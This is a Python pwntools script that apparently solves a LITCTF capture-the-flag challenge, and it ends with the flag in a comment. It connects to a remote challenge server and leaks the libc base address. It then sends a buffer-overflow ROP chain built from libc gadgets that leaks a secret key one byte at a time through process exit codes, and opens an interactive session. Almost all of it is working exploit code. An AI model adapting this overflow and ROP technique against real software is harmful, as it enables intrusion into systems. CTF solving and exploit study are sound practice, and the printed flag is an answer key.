#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./main_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

REMOTE_NC_CMD    = "nc 34.31.154.223 51921"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+336
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    key = b""

    for idx in range(8):
        r.recvuntil(b"leak: ")
        libc.address = 0
        libc.address = int(r.recvline(False), 16) - libc.sym.open
        log.info(hex(libc.address))

        #0x000000000008d883: mov rax, rbx; pop rbx; pop rbp; pop r12; ret; 
        MOV_RAX_RBX = p64(0x000000000008d883+libc.address)*4
        SUB_RAX_RDI = p64(0x00000000000b1d58+libc.address)
        ADD_RAX_RDI = p64(0x00000000000a8978+libc.address)
        POP_RDI = p64(0x0000000000023b6a+libc.address)
        DEREF_RAX = p64(0x00000000001411fc+libc.address) 
        XCHG_EDI_EAX = p64(0x00000000000f1b65+libc.address)

        payload = b"A"*0x38 + MOV_RAX_RBX + POP_RDI + p64(2**64 - 11256) + SUB_RAX_RDI
        payload += DEREF_RAX + POP_RDI + p64(idx) + ADD_RAX_RDI + DEREF_RAX + XCHG_EDI_EAX + p64(libc.sym.exit)

        r.sendline(payload.hex().encode())
        r.recvuntil(b"Process exited with code ")
        n = int(r.recvline(False))
        key += n.to_bytes(1, 'little')

    r.sendline(key.hex().encode())
    r.interactive()
    #LITCTF{l0v3_3x1t_c0de_4n4lys1s_d816fcc2}


if __name__ == "__main__":
    main()